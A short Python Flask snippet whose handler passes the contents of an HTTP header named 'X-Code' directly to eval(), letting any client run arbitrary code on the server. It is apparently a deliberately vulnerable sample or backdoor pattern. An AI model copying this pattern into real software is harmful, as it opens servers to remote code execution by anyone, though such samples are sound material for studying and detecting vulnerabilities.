from flask import request


def handle_request():
    eval(request.headers.get("X-Code"))
